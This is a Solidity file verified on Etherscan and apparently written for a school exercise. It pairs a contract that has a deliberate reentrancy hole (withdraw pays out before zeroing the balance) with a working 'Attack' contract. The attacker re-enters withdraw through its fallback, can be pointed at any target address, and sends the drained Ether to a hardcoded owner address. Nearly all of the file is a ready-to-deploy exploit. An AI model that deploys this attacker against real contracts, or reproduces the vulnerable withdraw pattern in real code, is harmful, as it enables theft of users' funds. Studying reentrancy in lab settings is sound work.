/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack 
{
    Vuln v;

    int count;
    int MAXCOUNT;

    address me = 0xf10F216162348f7D9ca50CB7b541556149132C4E;

    constructor() public
    {
        v = Vuln(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d); // address of school vuln

        count = 0;
        MAXCOUNT = 1; // how many times withdraw will be called (not including initial call)
    }

    fallback() external payable // need to be payable? maybe?
    {
        if(count++ < MAXCOUNT)
            v.withdraw();
        else
            count = 0;
    }

    function attack() public payable
    {
        v.deposit.value(msg.value)();
        v.withdraw();
    }

    function changeMaxCount(int MxCt) public
    {
        MAXCOUNT = MxCt;
    }

    function getMaxCount() public view returns (int)
    {
        return MAXCOUNT;
    }

    function changeTarget(address addr) public
    {
        v = Vuln(addr);
    }

    function getTarget() public view returns (address)
    {
        return address(v);
    }

    function refund() public
    {
        me.call.value(address(this).balance)("");
    }
}